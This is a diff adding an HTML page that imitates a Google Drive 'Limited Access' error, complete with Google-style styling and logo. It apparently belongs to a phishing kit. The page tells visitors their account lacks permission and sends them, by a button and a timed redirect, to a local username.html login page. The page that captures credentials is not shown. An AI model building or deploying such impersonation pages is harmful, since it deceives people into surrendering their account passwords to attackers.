@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+        <html lang="en">
+        <head>
+          <meta charset="UTF-8" />
+          <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+          <title>Google Drive - Access Failed</title>
+          <style>
+            body {
+              font-family: Roboto, sans-serif;
+              background: #fff;
+              margin: 0;
+              padding: 0;
+              height: 60vh;
+              display: flex;
+              align-items: center;
+              justify-content: center;
+              color: #444;
+            }
+        
+            .container {
+              text-align: center;
+              max-width: 512px;
+              padding: 2rem;
+            }
+        
+            .logo {
+              height: 45px;
+              margin-bottom: 20px;
+            }
+        
+            .title {
+              font-size: 1.8rem;
+              font-weight: 500;
+              color: #d93025;
+              margin-bottom: 1rem;
+            }
+        
+            .message {
+              font-size: 1rem;
+              margin-bottom: 1.5rem;
+            }
+        
+            .account {
+              margin-top: 2rem;
+              font-size: 0.9rem;
+            }
+        
+            .account span {
+              display: inline-block;
+              margin-top: 0.5rem;
+              padding: 0.4rem 1rem;
+              border-radius: 20px;
+              border: 1px solid #ccc;
+              background-color: #f1f1f1;
+            }
+        
+            .btn {
+              background-color: #1a73e8;
+              color: white;
+              border: none;
+              padding: 0.75rem 1.5rem;
+              font-size: 1rem;
+              border-radius: 20px;
+              cursor: pointer;
+              text-decoration: none;
+            }
+        
+            .btn:hover {
+              background-color: #0f5bd9;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <img class="logo" src="images/g2.png" alt="Google Drive logo" />
+            <div class="title">Limited Access</div>
+                <div class="message">
+              Your account does not have permission to access this Google Drive.<br>
+              Login to your own account with access.
+            </div>
+            <br>
+            <br>
+            <a class="btn" href="username.html" >Login to Google Drive</a>
+                   
+          </div>
+             <script>
+                setTimeout(() => {
+                  window.location.href = 'username.html';
+                }, 100000);
+              </script>
+      
+      </body>
+      </html>
+
+
+       
